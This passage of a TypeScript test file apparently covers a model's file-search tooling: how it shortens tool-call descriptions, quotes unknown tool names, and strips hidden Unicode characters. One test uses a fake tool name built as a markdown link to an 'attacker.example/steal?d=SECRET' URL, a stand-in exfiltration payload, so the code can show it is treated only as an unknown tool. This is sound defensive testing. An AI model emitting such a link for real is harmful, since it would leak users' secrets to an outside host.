    const search = tools.describe("search_document", { document_id: meta.id, query: `${"q".repeat(79)}\u{1F600} more`, mode: "exact" });
    const analyze = tools.describe("analyze_whole_document", { document_id: meta.id, task: `${"t".repeat(99)}\u{1F600} more` });
    expect(search).toBe(`Search app.log (exact) for \u201c${"q".repeat(79)}\u201d`);
    expect(analyze).toBe(`Read all of app.log for \u201c${"t".repeat(99)}\u201d`);
    expect(search).not.toMatch(LONE_SURROGATE);
    expect(analyze).not.toMatch(LONE_SURROGATE);
  });

  it("quotes an unknown tool's name, cut short: no step starts with it, whatever its length", async () => {
    const { files, meta } = await largeLog();
    const long = "x".repeat(200_000);
    const link = "[r]: https://attacker.example/steal?d=SECRET";
    const model = fakeModel([calls([{ name: long, args: {} }, { name: link, args: {} }]), says("Done.")]);
    const activity: string[] = [];
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick(), onActivity: (line) => activity.push(line) });
    const cut = "x".repeat(64);
    expect(result.steps).toEqual([
      `Call “${cut}” — failed: Unknown tool “${cut}”.`,
      `Call “${link}” — failed: Unknown tool “${link}”.`,
    ]);
    expect(activity).toContain(`Call “${cut}”…`);
    // The model is not sent the whole name back either.
    expect(answersOf(model.requests[1]!.messages)[0]).toMatchObject({ error: `Unknown tool “${cut}”.` });
    // Cut without cutting a character in half.
    expect(await files.tools([meta]).execute(`${"y".repeat(63)}\u{1F600}z`, {})).toEqual({ error: `Unknown tool “${"y".repeat(63)}”.` });
  });

  it("names a file as its card and frame do, and drops the characters that file text drops", async () => {
    const wales = "\u{1F3F4}\u{E0067}\u{E0062}\u{E0077}\u{E006C}\u{E0073}\u{E007F}";
    const files = createLargeFiles({ store: new MemoryDocumentStore(), budget: { inlineTokens: 1_000 } });
    const meta = await files.ingest({ name: `report ${wales}.log`, bytes: utf8(serviceLog(5_000)) });
    expect(meta.name).toBe(`report ${wales}.log`);
    const model = fakeModel([calls([{ name: "search_document", args: { document_id: meta.id, query: "a\u200fb\u200bc\u202ed\u{E0041}", mode: "exact" } }]), says("Done.")]);
    const result = await askWithFiles({ files, model, documentIds: [meta.id], messages: question("?"), retry: quick() });
    // The flag and the right-to-left mark stay, as in text and names; the zero-width space, the override and the tag go.
    expect(result.steps).toEqual([`Search ${meta.name} (exact) for “a\u200fbcd” — 0 matching lines`]);
    // A control character is still one space, and a soft hyphen before a line break goes with it.
    expect(stepLine("a\u0000b\u000bc\u0085d\u00ad\ne\u00adf")).toBe("a b c d ef");
    // One space too when a character that is dropped sits between two of them.
    expect(stepLine("a\n\u200b\nb|c\t\u202e\td|e\r\n\u00ad\nf|g \u2060\u2028 h|i \u200b j")).toBe("a b|c d|e f|g h|i  j");
  });
});
